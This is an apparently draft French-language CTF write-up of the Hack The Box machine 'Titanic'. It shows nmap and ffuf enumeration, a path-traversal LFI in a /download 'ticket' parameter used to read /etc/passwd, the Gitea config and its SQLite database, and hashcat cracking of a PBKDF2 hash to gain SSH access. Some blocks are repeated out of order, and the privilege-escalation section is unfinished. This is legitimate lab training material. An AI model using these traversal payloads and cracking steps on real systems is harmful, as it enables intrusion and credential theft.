---
# === Archetype writeups – v1 (stable) ===
# === Archetype: writeups (Page Bundle) ===
# Copié vers content/writeups/<nom_ctf>/index.md

# H1 SEO (via title, pas dans le markdown)
title: "Titanic — HTB Easy Writeup & Walkthrough"
linkTitle: "Titanic"
slug: "titanic"
date: 2026-04-22T17:39:54+02:00
#lastmod: 2026-04-22T17:39:54+02:00
draft: true

# --- PaperMod / navigation ---
type: "writeups"
summary: "Summary générique de machine CTF"
description: "Description générique de machine CTF"
tags: ["Hack The Box","HTB Easy","linux-privesc"]
categories: ["Mes writeups"]

# Ajouter ensuite uniquement des tags techniques réellement utilisés dans le writeup,
# par exemple :
# - prise de pied : "Web", "SSH", "FTP"
# - faille : "XSS", "LFI", "RCE", "Path Traversal", "Shellshock"
# - techno / produit : "Grafana", "Chamilo", "CMS Made Simple", "js2py"
# - CVE : "CVE-2021-43798"
# - pivot : "Credential Reuse"
# - privesc spécifique : "sudo", "Docker", "Cron", "ACL", "PATH Hijacking", "tmux", "npbackup", "pspy64"

# --- TOC & mise en page ---
ShowToc: true
TocOpen: true
# toc_droite: 1

# --- Cover / images (Page Bundle) ---
cover:
  image: "image.png"
  alt: "Titanic"
  caption: ""
  relative: true
  hidden: false
  hiddenInList: false
  hiddenInSingle: false

# --- Paramètres CTF (placeholders à éditer après création) ---
ctf:
  platform: "Hack The Box"
  machine: "Titanic"
  difficulty: "Easy | Medium | Hard"
  target_ip: "10.129.x.x"
  skills: ["Enumeration","Web","Privilege Escalation"]
  time_spent: "2h"
  # vpn_ip: "10.10.14.xx"
  # notes: "Points d'attention…"

# --- Options diverses ---
# weight: 10
# ShowBreadCrumbs: true
# ShowPostNavLinks: true

# --- SEO Reminders (à compléter après création) ---
# 1) Titre :
#    - Doit contenir : Nom Machine + HTB Easy + Writeup
# 2) Description :
#    - Résumé 130–160 caractères
#    - Style “Mix Parfait” : pédagogique + technique
#    - Exemple : "Writeup de <machine> (HTB Easy) : énumération claire, analyse de la vulnérabilité et escalade structurée."
# 3) ALT (image de couverture) :
#    - Mixer vulnérabilité + pédagogie + progression
#    - Exemple : "Machine <machine> HTB Easy vulnérable à <faille>, expliquée étape par étape jusqu'à l'escalade."
# 4) Tags :
#    - Toujours ["Easy"]
#    - Ajouter d'autres selon le thème : ["web","shellshock","heartbleed","enum"]
# 5) Structure :
#    - H1 = titre
#    - Description = meta description + preview social
#    - ALT = SEO image + accessibilité

# --- SEO CHECKLIST (à valider avant publication) ---

# [ ] 1) Titre (title + H1)
#     - Contient : Nom Machine + HTB Easy + Writeup
#     - Unique sur le site
#     - Lisible hors contexte HTB

# [ ] 2) Description (meta)
#     - 130–160 caractères
#     - Pas générique
#     - Ton pédagogique + technique
#     - Exemple :
#       "Writeup de <machine> (HTB Easy) : énumération claire,
#        compréhension de la vulnérabilité et escalade structurée."

# [ ] 3) Image de couverture
#     - Présente (ou fallback)
#     - Nom explicite
#     - Dimensions cohérentes

# [ ] 4) ALT de l’image
#     - Décrit la machine + l’approche
#     - Pédagogique (pas juste technique)
#     - Exemple :
#       "Machine <machine> HTB Easy exploitée étape par étape,
#        de l’énumération à l’escalade de privilèges."

# [ ] 5) Tags
#     - Toujours inclure la difficulté (ex: "Easy")
#     - Ajouter uniquement des tags techniques réels

# [ ] 6) Structure du contenu
#     - Un seul H1
#     - Sections claires et hiérarchisées
#     - Pas de sections SEO artificielles

---

<!-- ====================================================================
Tableau d'infos (modèle) — Remplacer les valeurs entre <...> après création.
Aucun templating Hugo dans le corps, pour éviter les erreurs d'archetype.
====================================================================
| Champ          | Valeur |
|----------------|--------|
| **Plateforme** | <Hack The Box> |
| **Machine**    | <Titanic> |
| **Difficulté** | <Easy / Medium / Hard> |
| **Cible**      | <10.129.x.x> |
| **Durée**      | <2h> |
| **Compétences**| <Enumeration, Web, Privilege Escalation> |

---
-->
## Introduction

- Contexte (source, thème, objectif).
- Hypothèses initiales (services attendus, techno probable).
- Objectifs : obtenir `user.txt` puis `root.txt`.

---

## Énumération

{{< enum-intro >}}

### Scan initial

Le scan TCP complet (`scans_nmap/full_tcp_scan.txt`) révèle les ports ouverts suivants :

```bash
nmap -sCV -p- -T4 -oN scans/nmap_full.txt titanic.htb
```

```bash
# Nmap 7.98 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -p- --min-rate 5000 -T4 -oN scans_nmap/full_tcp_scan.txt titanic.htb
Nmap scan report for titanic.htb (10.129.x.x)
Host is up (0.012s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

# Nmap done at [date] -- 1 IP address (1 host up) scanned in 8.50 seconds

```



### Scan FTP/SMB (si services détectés)

Après le scan initial, le script enchaîne automatiquement avec une phase d’énumération ciblée **FTP/SMB** si l’un des services suivants est détecté :

- **FTP** sur le port **21**
- **SMB** sur le port **139** et/ou **445**

Les résultats sont enregistrés dans (`scans_nmap/enum_ftp_smb_scan.txt`) :

```bash
# mon-nmap — ENUM FTP / SMB
# Target : titanic.htb
# Date   : [date]

Aucun service FTP (21) ni SMB (139/445) détecté.
Ports ouverts détectés : 22,80
```



### Scan agressif

Le script enchaîne ensuite automatiquement sur un scan agressif orienté vulnérabilités.

Ce scan fournit des informations détaillées sur les services et versions détectés.

Les résultats sont enregistrés dans (`scans_nmap/aggressive_vuln_scan.txt`) :

```bash
 nmap -Pn -A -sV -p"22,2222,8080,35627,42277" --script="http-vuln-*,http-shellshock,http-sql-injection,ssl-cert,ssl-heartbleed,sslv2,ssl-dh-params" --script-timeout=30s -T4 "titanic.htb"
```

```bash
[+] Scan agressif orienté vulnérabilités (CTF-perfect LEGACY) pour titanic.htb
[+] Commande utilisée :
    nmap -Pn -A -sV -p"22,80" --script="(http-vuln-* or http-shellshock or ssl-heartbleed) and not (http-vuln-cve2017-1001000 or http-sql-injection or ssl-cert or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 "titanic.htb"

# Nmap 7.98 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -A -sV -p22,80 "--script=(http-vuln-* or http-shellshock or ssl-heartbleed) and not (http-vuln-cve2017-1001000 or http-sql-injection or ssl-cert or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 -oN scans_nmap/aggressive_vuln_scan_raw.txt titanic.htb
Nmap scan report for titanic.htb (10.129.x.x)
Host is up (0.0083s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
| http-server-header: 
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/3.0.3 Python/3.10.12
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   60.38 ms 10.10.x.x
2   7.22 ms  titanic.htb (10.129.x.x)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at [date] -- 1 IP address (1 host up) scanned in 10.68 seconds

```



### Scan ciblé CMS

Le script exécute ensuite un scan ciblé CMS (scans_nmap/cms_vuln_scan.txt).

```bash
# Nmap 7.98 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -sV -p22,80 --script=http-wordpress-enum,http-wordpress-brute,http-wordpress-users,http-drupal-enum,http-drupal-enum-users,http-joomla-brute,http-generator,http-robots.txt,http-title,http-headers,http-methods,http-enum,http-devframework,http-cakephp-version,http-php-version,http-config-backup,http-backup-finder,http-sitemap-generator --script-timeout=30s -T4 -oN scans_nmap/cms_vuln_scan.txt titanic.htb
Nmap scan report for titanic.htb (10.129.x.x)
Host is up (0.013s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
| http-server-header: 
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/3.0.3 Python/3.10.12
| http-sitemap-generator: 
|   Directory structure:
|     /
|       Other: 1
|     /static/
|       css: 1
|     /static/assets/images/
|       ico: 1; jpg: 3
|   Longest directory structure:
|     Depth: 3
|     Dir: /static/assets/images/
|   Total files found (by extension):
|_    Other: 1; css: 1; ico: 1; jpg: 3
|_http-devframework: Couldn't determine the underlying framework or CMS. Try increasing 'httpspider.maxpagecount' value to spider more pages.
| http-methods: 
|_  Supported Methods: GET OPTIONS HEAD
| http-headers: 
|   Date: [date]
|   Server: Werkzeug/3.0.3 Python/3.10.12
|   Content-Type: text/html; charset=utf-8
|   Content-Length: 7399
|   Connection: close
|   
|_  (Request type: HEAD)
|_http-title: Titanic - Book Your Ship Trip
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at [date] -- 1 IP address (1 host up) scanned in 14.62 seconds

```



### Scan UDP rapide

Le script lance également un scan UDP rapide afin de détecter d’éventuels services supplémentaires (`scans_nmap/udp_vuln_scan.txt`).

```bash
# Nmap 7.98 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -n -Pn -sU --top-ports 20 -T4 -oN scans_nmap/udp_vuln_scan.txt titanic.htb
Warning: 10.129.x.x giving up on port because retransmission cap hit (6).
Nmap scan report for titanic.htb (10.129.x.x)
Host is up (0.011s latency).

PORT      STATE         SERVICE
53/udp    closed        domain
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
123/udp   closed        ntp
135/udp   closed        msrpc
137/udp   closed        netbios-ns
138/udp   closed        netbios-dgm
139/udp   closed        netbios-ssn
161/udp   closed        snmp
162/udp   closed        snmptrap
445/udp   closed        microsoft-ds
500/udp   open|filtered isakmp
514/udp   closed        syslog
520/udp   open|filtered route
631/udp   closed        ipp
1434/udp  closed        ms-sql-m
1900/udp  closed        upnp
4500/udp  closed        nat-t-ike
49152/udp closed        unknown

# Nmap done at [date] -- 1 IP address (1 host up) scanned in 12.30 seconds

```



### Énumération des chemins web
Pour la découverte des chemins web, tu peux utiliser le script dédié {{< script "mon-recoweb" >}}

```bash
mon-recoweb titanic.htb

# Résultats dans le répertoire scans_recoweb/
#  - scans_recoweb/RESULTS_SUMMARY.txt     ← vue d’ensemble des découvertes
#  - scans_recoweb/dirb.log
#  - scans_recoweb/dirb_hits.txt
#  - scans_recoweb/ffuf_dirs.txt
#  - scans_recoweb/ffuf_dirs_hits.txt
#  - scans_recoweb/ffuf_files.txt
#  - scans_recoweb/ffuf_files_hits.txt
#  - scans_recoweb/ffuf_dirs.json
#  - scans_recoweb/ffuf_files.json

```

Le fichier `RESULTS_SUMMARY.txt`  regroupe les chemins découverts., sans parcourir l’ensemble des logs générés.

```bash
===== mon-recoweb — RÉSUMÉ DES RÉSULTATS =====
Commande principale : /home/kali/.local/bin/mes-scripts/mon-recoweb
Script              : mon-recoweb v2.2.1

Cible        : titanic.htb
Périmètre    : /
Date début   : [date]

Commandes exécutées (exactes) :

[dirb — découverte initiale]
dirb http://titanic.htb/ /usr/share/wordlists/dirb/common.txt -r | tee scans_recoweb/titanic.htb/dirb.log

[ffuf — énumération des répertoires]
ffuf -u http://titanic.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 30 -timeout 10 -fc 404 -of json -o scans_recoweb/titanic.htb/ffuf_dirs.json 2>&1 | tee scans_recoweb/titanic.htb/ffuf_dirs.log

[ffuf — énumération des fichiers]
ffuf -u http://titanic.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -t 30 -timeout 10 -fc 404 -of json -o scans_recoweb/titanic.htb/ffuf_files.json 2>&1 | tee scans_recoweb/titanic.htb/ffuf_files.log

Processus de génération des résultats :
- Les sorties JSON produites par ffuf constituent la source de vérité.
- Les entrées pertinentes sont extraites via jq (URL, code HTTP, taille de réponse).
- Les réponses assimilables à des soft-404 sont filtrées par comparaison des tailles et des codes HTTP.
- Les URLs finales sont reconstruites à partir du périmètre scanné (racine du site ou sous-répertoire ciblé).
- Les résultats sont normalisés sous la forme :
    http://cible/chemin (CODE:xxx|SIZE:yyy)
- Les chemins sont ensuite classés par type :
    • répertoires (/chemin/)
    • fichiers (/chemin.ext)
- Le fichier RESULTS_SUMMARY.txt est généré par agrégation finale, sans retraitement manuel,
  garantissant la reproductibilité complète du scan.

----------------------------------------------------

=== Résultat global (agrégé) ===

http://titanic.htb/book (CODE:405|SIZE:153)
http://titanic.htb/book/ (CODE:405|SIZE:153)
http://titanic.htb/. (CODE:200|SIZE:7399)
http://titanic.htb/download (CODE:400|SIZE:41)
http://titanic.htb/server-status (CODE:403|SIZE:276)
http://titanic.htb/server-status/ (CODE:403|SIZE:276)

=== Détails par outil ===

[DIRB]
http://titanic.htb/book (CODE:405|SIZE:153)
http://titanic.htb/download (CODE:400|SIZE:41)
http://titanic.htb/server-status (CODE:403|SIZE:276)

[FFUF — DIRECTORIES]
http://titanic.htb/book/ (CODE:405|SIZE:153)
http://titanic.htb/server-status/ (CODE:403|SIZE:276)

[FFUF — FILES]
http://titanic.htb/. (CODE:200|SIZE:7399)

```



### Recherche de vhosts

Enfin, tu peux tester la présence de vhosts à l’aide du script {{< script "mon-subdomains" >}}.

```bash
mon-subdomains titanic.htb

# Résultats dans le répertoire scans_subdomains/
#  - scans_subdomains/scan_vhosts.txt
```

Si aucun vhost distinct n’est identifié, ce fichier confirme l’absence de résultats supplémentaires.

```bash
=== mon-subdomains titanic.htb START ===
Script       : mon-subdomains
Version      : mon-subdomains 2.0.0
Date         : [date]
Domaine      : titanic.htb
IP           : 10.129.x.x
Mode         : large
Master       : /usr/share/wordlists/htb-dns-vh-5000.txt
Codes        : 200,301,302,401,403  (strict=1)

VHOST totaux : 1
  - dev.titanic.htb

--- Détails par port ---
Port 80 (http)
  Baseline#1: code=301 size=315 words=28 (Host=jy6aldc9ms.titanic.htb)
  Baseline#2: code=301 size=315 words=28 (Host=4qhdlyh1pi.titanic.htb)
  Baseline#3: code=301 size=315 words=28 (Host=u6reavmze8.titanic.htb)
  After-redirect#1: code=200 size=7399 words=415
  After-redirect#2: code=200 size=7399 words=415
  After-redirect#3: code=200 size=7399 words=415
  VHOST (1)
    - dev.titanic.htb



=== mon-subdomains titanic.htb END ===
```



## Prise pied

L’énumération montre une surface d’attaque limitée à **SSH (22)** et **HTTP (80)**. L’accès initial devra passer par l’**application web**.

Le site repose sur une application Python derrière Apache, ce qui indique un comportement dynamique.

Les pages **`/book`** et **`/download`** sont identifiées. Elles devront être prises en compte pour la suite.

Enfin, le vhost **`dev.titanic.htb`** constitue une piste supplémentaire à explorer.

La suite consiste à analyser le fonctionnement du site et à comprendre comment utiliser ces différents points d’entrée.

### Exploration de la page web

![Formulaire web Book Your Trip sur Titanic HTB permettant de saisir des informations de réservation](book-your-trip.png)

Après avoir cliqué sur **"Book Now"**, rempli le formulaire et validé avec **"Submit"**, le site propose de télécharger un fichier au format JSON, par exemple `575d025b-c899-419f-bc15-88be35099959.json`.

Le fichier JSON ne contient que les données du formulaire (nom, email, téléphone, date et cabine), sans information supplémentaire exploitable à ce stade.

```json
{"name": "noelnac", "email": "noelnac@test.com", "phone": "+32111222333", "date": "2026-05-02", "cabin": "Deluxe"}
```

Pour comprendre comment fonctionne la réservation, tu peux examiner le code source de la page. Cela permet d’identifier l’URL de soumission du formulaire, la méthode HTTP utilisée et les champs transmis au serveur.

```html
<form action="/book" method="post">
  <input type="text" name="name" placeholder="Full Name" required>
  <input type="email" name="email" placeholder="Email address" required>
  <input type="tel" name="phone" placeholder="Phone Number" required>
  <input type="date" name="date" required>
  <select name="cabin">
    <option>Standard</option>
    <option>Deluxe</option>
    <option>Suite</option>
  </select>
  <button type="submit">Submit</button>
</form>
```

L’analyse du formulaire montre que les données sont envoyées vers **`/book`** avec la méthode **POST**, à l’aide des paramètres **`name`**, **`email`**, **`phone`**, **`date`** et **`cabin`**.

À partir de ces éléments, tu peux reconstruire la requête avec `curl`. L’option `-i` permet d’afficher les en-têtes de la réponse HTTP, notamment la redirection vers le téléchargement.

```bash
curl -i -X POST http://titanic.htb/book \
  -d "name=noelnac" \
  -d "email=noelnac@test.com" \
  -d "phone=+32111222333" \
  -d "date=2026-05-02" \
  -d "cabin=Deluxe"
```

La réponse du serveur est la suivante :

```bash
HTTP/1.1 302 FOUND
Date: [date]
Server: Werkzeug/3.0.3 Python/3.10.12
Content-Type: text/html; charset=utf-8
Content-Length: 303
Location: /download?ticket=c9a902b9-4a78-4b18-8fa9-d2169d144de3.json

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/download?ticket=c9a902b9-4a78-4b18-8fa9-d2169d144de3.json">/download?ticket=c9a902b9-4a78-4b18-8fa9-d2169d144de3.json</a>. If not, click the link.
```

Le serveur redirige vers l’endpoint **`/download`** avec un paramètre `ticket`, qui correspond au fichier JSON généré.

### Exploitation du paramètre `ticket`

Le paramètre **`ticket`** utilisé dans `/download` indique que le serveur charge un fichier en fonction de ce qui est fourni dans l’URL. Ce comportement peut ouvrir la voie à une **lecture de fichiers locaux (LFI)** si le paramètre n’est pas correctement contrôlé.

Pour le vérifier, tu peux tenter d’accéder à un fichier système classique comme `/etc/passwd` en utilisant une séquence de traversal :

```bash
curl "http://titanic.htb/download?ticket=../../../../etc/passwd"
```

La réponse confirme que le contenu du fichier est bien accessible :

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```

Le paramètre **`ticket`** est donc vulnérable à une **LFI via path traversal**, permettant de lire des fichiers arbitraires sur le système.

A noter que le fichier `/etc/passwd` révèle notamment la présence d’un utilisateur standard :

```bash
developer:x:1000:1000:developer:/home/developer:/bin/bash
```

Cet utilisateur **`developer`** constitue une cible potentielle pour la suite de l’exploitation.

Tu disposes désormais d’une méthode pour récupérer des fichiers sensibles (configuration, clés, identifiants, etc.) via la LFI.

À partir de l’utilisateur identifié, tu peux cibler directement son répertoire personnel. La LFI permet alors de tenter l’accès à des fichiers sensibles, comme le flag utilisateur ou des clés SSH :

```bash
# flag user.txt
curl "http://titanic.htb/download?ticket=../../../../home/developer/user.txt"
# clés SSH
curl "http://titanic.htb/download?ticket=../../../../home/developer/.ssh/id_rsa"
curl "http://titanic.htb/download?ticket=../../../../home/developer/.ssh/authorized_keys"

# historique bash
curl "http://titanic.htb/download?ticket=../../../../home/developer/.bash_history"
```

Résultats :

```bash
curl "http://titanic.htb/download?ticket=../../../../home/developer/user.txt"
f752xxxxxxxxxxxxxxxxxxxxxxxx8ddf

curl "http://titanic.htb/download?ticket=../../../../home/developer/.ssh/id_rsa"
{"error":"Ticket not found"}

curl "http://titanic.htb/download?ticket=../../../../home/developer/.ssh/authorized_keys"

curl "http://titanic.htb/download?ticket=../../../../home/developer/.bash_history"
                            
```

La LFI te permet d’accéder directement au fichier `user.txt` sans obtenir de shell.

Cette méthode te permet de récupérer le flag, mais elle ne te permet pas d’aller plus loin. Sans shell, tu ne peux pas poursuivre vers une élévation de privilèges.

Tu dois donc maintenant chercher à obtenir un accès interactif à la machine.

### Analyse du vhost `dev.titanic.htb`

Après avoir ajouté **`dev.titanic.htb`** dans `/etc/hosts`, tu accèdes à une instance **Gitea 1.22.1**.

![Page d’accueil Gitea sur le vhost dev.titanic.htb révélant un service Git exposé](dev-titanic-htb.png)

La page d’accueil permet d’identifier le service comme étant **Gitea**, en version **1.22.1**.

En explorant les fichiers disponibles, tu récupères notamment un `docker-compose.yml` contenant le volume suivant :

```yaml
volumes:
  - /home/developer/gitea/data:/data
```

Cette configuration indique que le répertoire `/data` utilisé par Gitea dans le conteneur correspond à `/home/developer/gitea/data` sur l’hôte.

Dans Gitea, le fichier de configuration principal est généralement situé dans `/data/gitea/conf/app.ini`, ce qui correspond ici à :

```text
/home/developer/gitea/data/gitea/conf/app.ini
```

Grâce à la LFI, tu peux alors récupérer ce fichier :

```bash
curl "http://titanic.htb/download?ticket=../../../../home/developer/gitea/data/gitea/conf/app.ini"
```

L’analyse de `app.ini` montre que Gitea utilise une base **SQLite** :

```text
[database]
PATH = /data/gitea/gitea.db
DB_TYPE = sqlite3
```

Le fichier de base de données se trouve donc dans :

```text
/home/developer/gitea/data/gitea/gitea.db
```

Tu peux ensuite le télécharger avec la LFI :

```bash
curl -o gitea.db \
  "http://titanic.htb/download?ticket=../../../../home/developer/gitea/data/gitea/gitea.db"
```

Une fois la base récupérée, tu peux l’analyser localement avec `sqlite3` et extraire les informations de l’utilisateur `developer` :

```bash
sqlite3 gitea.db "select name,passwd,passwd_hash_algo,salt from user where name='developer';"
developer|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|pbkdf2$50000$50|8bf3e3452b78544f8bee9400d6936d34
```

Le hash PBKDF2 récupéré depuis la base Gitea peut être cassé hors ligne à l’aide de **Hashcat**.

Le format attendu pour ce type de hash (PBKDF2-HMAC-SHA256) est :

```text
sha256:iterations:salt:hash
```

On construit donc le fichier `hash.txt` avec les informations extraites :

```bash
echo "sha256:50000:8bf3e3452b78544f8bee9400d6936d34:e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56" > hash.txt
```

On lance ensuite Hashcat avec une wordlist classique :

```bash
hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt
```

Une fois l’attaque terminée, le mot de passe peut être affiché avec :

```b
hashcat -m 10900 hash.txt --show
sha256:50000:8bf3e3452b78544f8bee9400d6936d34:e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56:25282528
```

Le mot de passe de l’utilisateur `developer` est donc :

```text
25282528

```









Le mot de passe est stocké sous forme de hash **PBKDF2** avec un salt. Un cassage hors ligne permet de retrouver le mot de passe :

```
25282528
```

Ce mot de passe permet ensuite d’obtenir un shell via SSH :

```
ssh developer@titanic.htb

```







```bash
curl "http://titanic.htb/download?ticket=../../../../home/developer/gitea/data/gitea/conf/app.ini"

APP_NAME = Gitea: Git with a cup of tea
RUN_MODE = prod
RUN_USER = git
WORK_PATH = /data/gitea

[repository]
ROOT = /data/git/repositories

[repository.local]
LOCAL_COPY_PATH = /data/gitea/tmp/local-repo

[repository.upload]
TEMP_PATH = /data/gitea/uploads

[server]
APP_DATA_PATH = /data/gitea
DOMAIN = gitea.titanic.htb
SSH_DOMAIN = gitea.titanic.htb
HTTP_PORT = 3000
ROOT_URL = http://gitea.titanic.htb/
DISABLE_SSH = false
SSH_PORT = 22
SSH_LISTEN_PORT = 22
LFS_START_SERVER = true
LFS_JWT_SECRET = OqnUg-uJVK-l7rMN1oaR6oTF348gyr0QtkJt-JpjSO4
OFFLINE_MODE = true

[database]
PATH = /data/gitea/gitea.db
DB_TYPE = sqlite3
HOST = localhost:3306
NAME = gitea
USER = root
PASSWD = 
LOG_SQL = false
SCHEMA = 
SSL_MODE = disable

[indexer]
ISSUE_INDEXER_PATH = /data/gitea/indexers/issues.bleve

[session]
PROVIDER_CONFIG = /data/gitea/sessions
PROVIDER = file

[picture]
AVATAR_UPLOAD_PATH = /data/gitea/avatars
REPOSITORY_AVATAR_UPLOAD_PATH = /data/gitea/repo-avatars

[attachment]
PATH = /data/gitea/attachments

[log]
MODE = console
LEVEL = info
ROOT_PATH = /data/gitea/log

[security]
INSTALL_LOCK = true
SECRET_KEY = 
REVERSE_PROXY_LIMIT = 1
REVERSE_PROXY_TRUSTED_PROXIES = *
INTERNAL_TOKEN = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE3MjI1OTUzMzR9.X4rYDGhkWTZKFfnjgES5r2rFRpu_GXTdQ65456XC0X8
PASSWORD_HASH_ALGO = pbkdf2

[service]
DISABLE_REGISTRATION = false
REQUIRE_SIGNIN_VIEW = false
REGISTER_EMAIL_CONFIRM = false
ENABLE_NOTIFY_MAIL = false
ALLOW_ONLY_EXTERNAL_REGISTRATION = false
ENABLE_CAPTCHA = false
DEFAULT_KEEP_EMAIL_PRIVATE = false
DEFAULT_ALLOW_CREATE_ORGANIZATION = true
DEFAULT_ENABLE_TIMETRACKING = true
NO_REPLY_ADDRESS = noreply.localhost

[lfs]
PATH = /data/git/lfs

[mailer]
ENABLED = false

[openid]
ENABLE_OPENID_SIGNIN = true
ENABLE_OPENID_SIGNUP = true

[cron.update_checker]
ENABLED = false

[repository.pull-request]
DEFAULT_MERGE_STYLE = merge

[repository.signing]
DEFAULT_TRUST_MODEL = committer

[oauth2]
JWT_SECRET = FIAOKLQX4SBzvZ9eZnHYLTCiVGoBtkE4y5B7vMjzz3g

```



```bash
sqlite3 gitea.db "select name,passwd,passwd_hash_algo,salt from user where name='developer';"
developer|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|pbkdf2$50000$50|8bf3e3452b78544f8bee9400d6936d34

```



## Escalade de privilèges

{{< escalade-intro user="ssh_user" >}}

### Sudo -l
Tu commences toujours par vérifier les droits sudo :

### Recherche de binaires SUID
Tu poursuis l’énumération en recherchant les **binaires SUID**, qui permettent parfois d’exécuter certaines commandes avec les privilèges de leur propriétaire.

```bash
find / -perm -4000 -type f 2>/dev/null
```

La liste obtenue ne contient que des binaires système classiques tels que :

```texte
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/newgrp
...
```

Tu n’identifies aucun binaire inhabituel ou directement exploitable.

### Analyse des Linux capabilities

Tu vérifies ensuite si certains binaires disposent de **capabilities Linux**, qui permettent à un programme d’effectuer certaines actions privilégiées sans être exécuté en root ou via un binaire SUID.

La vérification se fait avec la commande suivante :

```bash
getcap -r / 2>/dev/null
```

Ici, tu ne trouves aucune capability inhabituelle ni aucun binaire exploitable.

### Vérification des SUID avec suid3num.py

Pour compléter l’analyse des binaires SUID, tu utilises l’outil suid3num.py, qui permet d’identifier rapidement :

les binaires SUID intéressants
leur présence éventuelle dans GTFOBins

Tu le télécharges et l’exécutes depuis un répertoire en mémoire (/dev/shm) :

```bash
cd /dev/shm
wget http://10.10.x.x:8000/suid3num.py
python3 suid3num.py
```
L’outil confirme que :

- tous les binaires SUID présents sont standards
- aucun binaire personnalisé n’est identifié
- aucun binaire exploitable via GTFOBins n’est détecté
  

Cette vérification confirme que la piste des SUID ne mène à rien dans ce cas précis.

### Inspection des tâches cron
Tu vérifies ensuite les **tâches planifiées (cron)**, car certains scripts exécutés automatiquement par le système peuvent être modifiables par un utilisateur et permettre une élévation de privilèges.

Les crons système peuvent être consultés avec :

```bash
cat /etc/crontab
```

### Analyse des services locaux
Tu vérifies ensuite les **services en cours d’exécution**, ce qui permet parfois d’identifier une application vulnérable ou un service mal configuré.

```
netstat -tulpn
```

### pspy64
Tu lances également pspy64 dans une deuxième session SSH afin d’observer en temps réel les processus exécutés sur la machine, notamment ceux lancés par root.

Tu le télécharges et l’exécutes depuis un répertoire persistant (/var/tmp) :

cd /var/tmp
wget http://10.10.x.x:8000/pspy64
chmod +x pspy64
